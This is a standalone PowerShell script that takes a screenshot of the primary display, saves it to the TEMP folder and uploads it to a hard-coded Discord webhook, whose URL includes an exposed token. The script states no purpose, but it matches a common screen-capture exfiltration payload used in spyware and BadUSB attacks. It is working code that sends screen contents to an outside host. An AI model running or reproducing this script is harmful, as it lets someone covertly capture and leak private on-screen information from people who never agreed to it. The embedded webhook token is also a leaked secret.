# Path to save screenshot
$screenshotPath = "$env:TEMP\screenshot.png"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Take screenshot
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()

# Upload screenshot to Discord webhook
$webhookUrl = 'https://discord.com/api/webhooks/1403825506452898004/oLxyFcyv0Fdw0aJqUtf7g5gKE49QtCu5E-1h2YnPZNLMLjQa8Tc0SvlECptNBuz7lbjH'

# Create multipart form data content
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$header = "--$boundary$LF" + 
          'Content-Disposition: form-data; name="file"; filename="screenshot.png"' + $LF + 
          "Content-Type: image/png$LF$LF"
$footer = "$LF--$boundary--$LF"

# Read file bytes
$fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
$headerBytes = [System.Text.Encoding]::ASCII.GetBytes($header)
$footerBytes = [System.Text.Encoding]::ASCII.GetBytes($footer)

# Combine all bytes
$bodyBytes = New-Object byte[] ($headerBytes.Length + $fileBytes.Length + $footerBytes.Length)
[Array]::Copy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
[Array]::Copy($fileBytes, 0, $bodyBytes, $headerBytes.Length, $fileBytes.Length)
[Array]::Copy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $fileBytes.Length, $footerBytes.Length)

# Prepare web request
$webRequest = [System.Net.WebRequest]::Create($webhookUrl)
$webRequest.Method = "POST"
$webRequest.ContentType = "multipart/form-data; boundary=$boundary"
$webRequest.ContentLength = $bodyBytes.Length
$requestStream = $webRequest.GetRequestStream()
$requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
$requestStream.Close()
$response = $webRequest.GetResponse()
$response.Close()

Write-Host "Screenshot uploaded successfully."